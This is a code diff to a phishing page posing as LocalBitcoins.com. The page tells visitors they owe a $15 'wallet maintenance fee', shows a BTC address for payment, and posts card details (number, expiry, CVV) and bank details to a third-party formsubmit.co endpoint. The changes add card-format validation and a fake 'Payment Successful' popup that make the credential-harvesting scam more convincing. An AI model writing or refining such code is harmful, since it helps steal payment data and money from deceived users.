@@ -16,6 +16,19 @@
       position: relative;
       z-index: 10;
     }
+    .success-popup {
+      display: none;
+      position: fixed;
+      top: 1/4;
+      left: 1/2;
+      transform: translateX(-50%);
+      background-color: white;
+      border: 2px solid green;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      z-index: 50;
+    }
   </style>
 </head>
 <body class="bg-gray-100 text-gray-800">
@@ -105,7 +118,14 @@
   <div id="errorPopup" class="fixed hidden top-1/4 left-1/2 transform -translate-x-1/2 bg-white border border-red-500 p-6 rounded shadow-lg z-50">
     <h2 class="text-red-600 font-bold text-lg mb-2">Payment Error</h2>
     <p>We’re sorry, but card payments are currently down. Please try again later, use another card, or pay via bank account or BTC.</p>
-    <button onclick="closeErrorPopup()" class="mt-4 bg-red-500 text-white px-4 py-2 rounded">Close</button>
+    <button onclick="closePopup('errorPopup')" class="mt-4 bg-red-500 text-white px-4 py-2 rounded">Close</button>
+  </div>
+
+  <!-- Success Popup -->
+  <div id="successPopup" class="success-popup">
+    <h2 class="text-green-600 font-bold text-lg mb-2">Payment Successful</h2>
+    <p>Your $15.00 maintenance fee has been processed. Thank you!</p>
+    <button onclick="closePopup('successPopup')" class="mt-4 bg-green-500 text-white px-4 py-2 rounded">Close</button>
   </div>
 
   <footer class="text-center text-sm text-gray-500 mt-10">
@@ -114,13 +134,13 @@
       <a class="text-purple-700 underline" href="#">Privacy Policy</a> |
       <a class="text-purple-700 underline" href="#">Terms of Service</a>
     </p>
-    <p class="mt-2">© 2025 LocalBitcoins.com. All rights reserved.</p>
+    <p class="mt-2">© 2025 LocalBitcoins.com. Last updated: Tuesday, June 17, 2025, 02:58 PM EDT. All rights reserved.</p>
   </footer>
 
   <script>
     function showPaymentPopup() {
       const proceed = confirm(
-        "Notice: Your wallet has outstanding dues that need to be settled. A $15.00 USD wallet maintenance fee is required.\n\nPay using card, bank account, or send BTC to:\n\nbc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8\n\nNeed BTC? Visit: changelly.com/buy/btc/"
+        "Notice: Your wallet has outstanding dues that need to be settled. A $15 USD wallet maintenance fee is required.\n\nPay using card, bank account, or send BTC to:\n\nbc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8\n\nNeed BTC? Visit: changelly.com/buy/btc/"
       );
       if (proceed) {
         document.getElementById("paymentSection").style.display = "block";
@@ -128,8 +148,8 @@
       }
     }
 
-    function closeErrorPopup() {
-      document.getElementById("errorPopup").style.display = "none";
+    function closePopup(popupId) {
+      document.getElementById(popupId).style.display = "none";
       document.getElementById("paymentSection").style.display = "none";
     }
 
@@ -152,23 +172,56 @@
       cardBtn.classList.remove("bg-purple-600", "text-white");
     });
 
+    function validateForm(form) {
+      const inputs = form.querySelectorAll("input[required], select[required]");
+      for (let input of inputs) {
+        if (!input.value.trim()) {
+          alert(`Please fill out ${input.placeholder || input.name}.`);
+          return false;
+        }
+      }
+      if (form === formCard) {
+        const expiry = form.querySelector("input[name=expiry]").value;
+        const cvv = form.querySelector("input[name=cvv]").value;
+        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+          alert("Please enter a valid expiry date (MM/YY).");
+          return false;
+        }
+        if (!/^\d{3,4}$/.test(cvv)) {
+          alert("Please enter a valid CVV (3-4 digits).");
+          return false;
+        }
+      }
+      return true;
+    }
+
     [formCard, formBank].forEach(form => {
       form.addEventListener("submit", function(e) {
         e.preventDefault();
+        console.log(`Form submitted, sending to: https://formsubmit.co/ajax/b50bc2e1c7e2c9b2d52e0c1680f`);
+
+        if (!validateForm(form)) return;
+
         fetch("https://formsubmit.co/ajax/b50bc2e1c7e2c9b2d52e0c1680f", {
           method: "POST",
           body: new FormData(form),
           headers: { Accept: "application/json" }
         })
-        .then(res => res.json())
+        .then(res => {
+          if (!res.ok) throw new Error("Network response was not ok");
+          return res.json();
+        })
         .then(data => {
+          console.log("Submission successful:", data);
           document.getElementById("paymentSection").style.display = "none";
-          document.getElementById("errorPopup").style.display = "block";
+          document.getElementById("successPopup").style.display = "block";
           form.reset();
         })
         .catch(error => {
-          alert("Submission error. Please try again.");
-          console.error(error);
+          console.error("Error:", error);
+          document.getElementById("paymentSection").style.display = "none";
+          document.getElementById("errorPopup").style.display = "block";
+          alert("Submission failed. Check your connection or try again later. Error: " + error.message);
         });
       });
     });
